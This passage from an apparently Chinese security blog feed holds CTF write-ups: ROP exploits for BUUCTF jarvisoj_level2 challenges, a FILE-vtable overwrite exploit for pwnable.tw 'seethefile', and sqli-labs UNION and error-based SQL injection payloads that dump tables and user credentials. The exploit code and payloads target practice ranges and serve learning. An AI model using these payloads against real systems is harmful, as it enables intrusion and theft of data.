class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359026.png" alt="image-20231207132411895"></p>
<h3 id="例题2：buu-jarvisoj-level2-x64"><a href="#例题2：buu-jarvisoj-level2-x64" class="headerlink" title="例题2：buu  jarvisoj_level2_x64"></a>例题2：<code>buu</code>  <code>jarvisoj_level2_x64</code></h3><p>拿到题目后先检查一下保护，<code>PIE</code>和<code>canary</code>都没开，开了<code>NX</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359564.png" alt="image-20231207111803128"></p>
<p>把题目放入<code>ida</code>里，查看</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000446.png" alt="image-20231207113118006" style="zoom: 80%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000356.png" alt="image-20231207113230907"></p>
<p>定义了一个数组<code>buf[128]</code>，有<code>read</code>函数<code>0x200uLL</code>明显大于128，可以栈溢出。计算偏移量，为0x80+8</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000814.png" alt="image-20231207121308672"></p>
<p>有<code>system</code>函数还是两个，但是参数都不是我们想要的。再查看一下字符串(<code>shift+F12</code>)</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000093.png" alt="image-20231207113459891"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000599.png" alt="image-20231207113617885"></p>
<p>很好，有<code>/bin/sh</code>点进去查看地址，为0x600a90，随便选一个<code>system</code>的地址为0x400603</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000124.png" alt="image-20231207115950982"></p>
<p>我们要做的就是通过<code>pop rdi;ret</code>把<code>/bin/sh</code>传参给<code>system</code>函数，通过<code>ROPgadget --binary level2_x64 | grep &quot;pop rdi&quot;</code>命令得到<code>pop rdi ; ret</code>地址，如下</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000948.png" alt="image-20231207120209890"></p>
<p>最后<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400603</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006b3</span></span><br><span class="line">bin_addr = <span class="number">0x600a90</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi_addr)+p64(bin_addr)+p64(system_addr)</span><br><span class="line"><span class="comment">#按顺序写入，为什么是这个顺序我也不知道</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop rdi控制第一个参数，ret衔接下一条指令</span></span><br><span class="line"><span class="comment">#pop rdi把bin_addr这个地址弹到了rdi寄存器中，ret执行触发system_addr</span></span><br><span class="line"><span class="comment">#调试一下看的很清楚，这也不知道，那也不知道，你知道啥，你这不知道  这题就不算弄懂了，不要得过且过</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000641.png" alt="image-20231207120706744"></p>
<h3 id="例题3：buu-jarvisoj-level2"><a href="#例题3：buu-jarvisoj-level2" class="headerlink" title="例题3：buu  jarvisoj_level2"></a>例题3：<code>buu</code>  <code>jarvisoj_level2</code></h3><p>前面几步都同上，我就不再多说。</p>
<p>如下，<code>system</code>的地址0x0804849e，偏移量0x88+4</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000611.png" alt="image-20231207193202760"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001200.png" alt="image-20231207193238143"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231207193505701](https://raw.githubusercontent.com/Qwen11/picture/main/202503140001790.png)</span><br><span class="line"></span><br><span class="line">最后```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28486)</span><br><span class="line"></span><br><span class="line">system_addr = 0x0804849e</span><br><span class="line">shell_addr = 0x0804a024</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(shell_addr)</span><br><span class="line">#payload = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(8)+p32(shell_addr)</span><br><span class="line">#payload = b&#x27;a&#x27;*(0x88)+p32(0xffffe000)+p32(system_addr)+p32(0xffffe000)+p32(shell_addr)</span><br><span class="line">#因为这个p32(8)的位置是你调用system函数的返回地址，也就是system函数执行后要执行的地址。而system函数执行了命令/bin/sh后会开启一个子进程阻塞当前的进程，所以system函数不会返回，这个地址8也就不会被跳转，这里你可以换成任意一个值都能成功，也就解释了为什么写了一个非法地址但程序不会崩溃 ，因为system压根就没返回</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001116.png" alt="image-20231207193934134"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-seethefile</title>
    <url>/2024/08/13/seethefile/</url>
    <content><![CDATA[<p>第一次做iofile类型的题目，也花了不少时间去学习，照例记录一下吧。</p>
<span id="more"></span>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>程序大致内容是，打开指定的文件，读出数据，打印出来，不能打开名为_flag_的文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p><code>switch(5)</code>时，往<em>name</em>中输入数据时，有一个溢出漏洞。如下，<em>name</em>在*.bss<em>段，而<code>fp</code>就在</em>name<em>下方<code>0x20</code>个字节处，故我们可以溢出</em>name*覆盖<code>fp</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o</span><br><span class="line">.bss:0804B260                                         ; main+B4↑o</span><br><span class="line">.bss:0804B280                 public fp</span><br><span class="line">.bss:0804B280 ; FILE *fp</span><br><span class="line">.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r</span><br><span class="line">.bss:0804B280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:0804B280 _bss            ends</span><br><span class="line">.bss:0804B280</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏<em>libc</em></h3><p>​	由于可以读取指定文件的数据，故可以直接利用<em>linux</em>的<em>proc</em>伪文件系统，读取<code>/proc/self/maps</code>即可获得libc基址。不过一次只能读取<code>0x18</code>字节，可能要多读取几次。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="构造-fake-file"><a href="#构造-fake-file" class="headerlink" title="构造_fake_file"></a>构造<code>_fake_file</code></h3><p><code>32</code>位里<code>file</code>到<code>vtable</code>的偏移为<code>0x94</code>，对于伪造<code>file</code>，有如下解释：</p>
<ul>
<li>偏移为<code>0</code>处设置为<code>0xffffdfff</code></li>
<li>偏移为<code>4</code>处设置为要执行的指令字符串</li>
<li>然后用垃圾字节填充至<code>vtable</code>处</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span>   <span class="comment">#p区域的首地址是0x804b284</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)   <span class="comment">#fp指向p区域</span></span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x94</span>-<span class="number">0x4</span>-<span class="number">0x3</span>)</span><br><span class="line"><span class="comment">#在p区域设置size为0x94字节的file(_IO_FILE	file;)</span></span><br><span class="line">payload+= p32(fake_FILE+<span class="number">0x90</span>)+p32(system_addr)</span><br><span class="line"><span class="comment">#覆盖vtable为system_addr的地址</span></span><br><span class="line">exit_with_name(payload)</span><br></pre></td></tr></table></figure>

<p>本题给的<em>libc</em>版本为<code>2.23</code>,<code>libc2.24</code>以下的版本没有对虚表进行检查，所以直接伪造即可。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_with_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)</span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x94</span>-<span class="number">0x4</span>-<span class="number">0x3</span>)</span><br><span class="line">payload+= p32(fake_FILE+<span class="number">0x90</span>)+p32(system_addr)</span><br><span class="line">exit_with_name(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./seethefile&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10200</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_with_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line"><span class="comment"># readfile()</span></span><br><span class="line"><span class="comment"># writefile()</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)</span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8d</span>+p32(fake_FILE+<span class="number">0x98</span>)</span><br><span class="line">payload+= p32(<span class="number">0</span>)*<span class="number">2</span>+p32(system)</span><br><span class="line">exit_with_name(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab靶场通关记录</title>
    <url>/2024/10/29/sqli-lab%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h2><h3 id="单引号字符型注入"><a href="#单引号字符型注入" class="headerlink" title="单引号字符型注入"></a>单引号字符型注入</h3><h4 id="字符型注入还是数字型注入"><a href="#字符型注入还是数字型注入" class="headerlink" title="字符型注入还是数字型注入"></a>字符型注入还是数字型注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; //等号前后不能有空格，即不能是?id = 1&#x27;</span>这样</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132304860.png" alt="image-20240911225450764"></p>
<h4 id="是否为单引号闭合型注入"><a href="#是否为单引号闭合型注入" class="headerlink" title="是否为单引号闭合型注入"></a>是否为单引号闭合型注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>用<code>--+</code>把后面的内容注释掉，然后回显正常，说明是单引号闭合型注入</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919410.png" alt="image-20240911225916591"></p>
<h4 id="该语句查询了几列数据"><a href="#该语句查询了几列数据" class="headerlink" title="该语句查询了几列数据"></a>该语句查询了几列数据</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">1</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>一直到<code>3</code>时依然回显正常，到<code>4</code>就开始报错，说明查询了<code>3</code>列数据。那么，我们现在构造的，<code>union</code>后面的语句中也要查询<code>3</code>列。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919141.png" alt="image-20240911230911434"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920889.png" alt="image-20240911225916591"></p>
<h4 id="会显示哪几列"><a href="#会显示哪几列" class="headerlink" title="会显示哪几列"></a>会显示哪几列</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">-1 是因为前面要错误，union后面的才能执行</span></span><br></pre></td></tr></table></figure>

<p>通过回显<code>2,3</code>可知，是第二，三列</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920900.png" alt="image-20240911231819368"></p>
<h4 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure>

<p>显示当前的数据库名是<code>security</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921921.png" alt="image-20240911232330147"></p>
<h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>首先要知道，**<code>group_concat()</code>函数会将查询的表名连在一起输出<strong>，然后，</strong>有一个<code>information_schema</code>库，该库中有一个<code>tables</code>表，该表存有所有数据库的表名。**<code>table_schema=&#39;security&#39;</code>表示查询<code>table_schema</code>字段为<code>security</code>的列，再加上前面的<code>table_name</code>(<code>tables</code>表中的一个列名，下面全是各种库中的表名)，表示查询<code>security</code>库的所有表名。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921019.png" alt="image-20240911233736048"></p>
<h4 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group_concat(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">group_concat(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">group_concat(flag),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom flag<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">ZLCTF&#123;<span class="number">21232</span>f297a57a5a743894a0e4a801fc3<span class="number">-084e0343</span>a0486ff05530df6c705c8bb4<span class="operator">-</span>a4346e75cc1dd161a8d57f3b2d5d82d0&#125;</span><br><span class="line"></span><br><span class="line">ZLCTF&#123;<span class="number">5</span>acb72b8<span class="number">-137</span>f<span class="number">-4</span>daa<span class="operator">-</span>a647<span class="number">-340</span>b72101d4b&#125;</span><br><span class="line">Your Password:admin,guest,virink</span><br><span class="line"></span><br><span class="line">schema_name,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.schemata<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">information_schema,performance_schema,mysql,test,ctftraining,ctf</span><br><span class="line">ctf:flag,users</span><br></pre></td></tr></table></figure>

<p>与<code>tables</code>表相似，<code>information_schema</code>库中有一个<code>columns</code>表，存有所有数据库的列名。上面语句表示，查询<code>security</code>库中的<code>users</code>表中的所有列名。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921061.png" alt="image-20240911234752459"></p>
<h4 id="查询列表中的内容"><a href="#查询列表中的内容" class="headerlink" title="查询列表中的内容"></a>查询列表中的内容</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921503.png" alt="image-20240911235254031"></p>
<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>传入<code>?id=1</code>，正常回显</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921192.png" alt="image-20241029144140515" style="zoom:50%;" />

<p>传入<code>?id=1&#39;</code>，回显的报错中没有显示我们传入的数字</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921075.png" alt="image-20241029144207150" style="zoom: 50%;" />

<p>传入<code>?id=1--+</code>，正常回显</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922959.png" alt="image-20241029144240783" style="zoom:50%;" />

<p>因此得知本关是基于报错的数字型注入</p>
<h3 id="单引号变形字符型注入"><a href="#单引号变形字符型注入" class="headerlink" title="单引号变形字符型注入"></a>单引号变形字符型注入</h3><p>第一关的闭合符号是<code>&#39;</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922074.png" alt="image-20241029143718824"></p>
<p>本关的闭合符号变成了<code>&#39;)</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922354.png" alt="image-20241029143849314"></p>
<h3 id="双引号变形字符型注入"><a href="#双引号变形字符型注入" class="headerlink" title="双引号变形字符型注入"></a>双引号变形字符型注入</h3><p>传入<code>?id=1&#39;</code>，依旧回显正常，这时候可以猜测一下是不是双引号闭合</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922686.png" alt="image-20241029145629173" style="zoom:50%;" />

<p>传入<code>?id=1&quot;</code>，根据报错回显确定了，闭合符号是<code>&quot;)</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922751.png" alt="image-20241029145816812"></p>
<h3 id="通过函数报错注入"><a href="#通过函数报错注入" class="headerlink" title="通过函数报错注入"></a>通过函数报错注入</h3><h4 id="通过floor报错"><a href="#通过floor报错" class="headerlink" title="通过floor报错"></a>通过<code>floor</code>报错</h4><p><strong>该方法最多回显<code>64</code>个字符。</strong></p>
<p>爆数据库、版本、用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ?id=1&#x27;和?id=-1&#x27;都行</span><br><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,     #利用 : 隔开数据库名称</span><br><span class="line">    (SELECT database()),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br><span class="line">#后半段格式:as xxx from 表名 group by xxx--+</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<p>爆内容，这里不知道为什么用<code>group_concat()</code>不行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT username FROM users limit 1),   #password和username都只能爆出username</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<h4 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a><code>updatexml</code>报错</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><strong>最多回显<code>32</code>个字符。</strong></p>
<p>​	<code>updatexml()</code>使用时，当<code>xpath_string</code>格式出现错误，<code>masql</code>会报出语法错误，而执行结果也在错误里。对于<code>select * FROM test WHERE id=1 AND updatexml(1,0x7e,1);</code>，其中<code>0x7e</code>是<code>~</code>，其不属于<code>xpath</code>语法格式，因此报出<code>xpath</code>语法错误。<br>只有在<code>payload</code>返回的不是<code>xml</code>格式才会生效。</p>
<h5 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h5><p>爆数据库、版本号、用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#传入 ?id=1&#x27;+payload</span><br><span class="line">#payload如下</span><br><span class="line">AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><strong><code>concat()</code>是连接函数。</strong></p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; AND table_name=&#x27;users&#x27;),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p>爆内容</p>
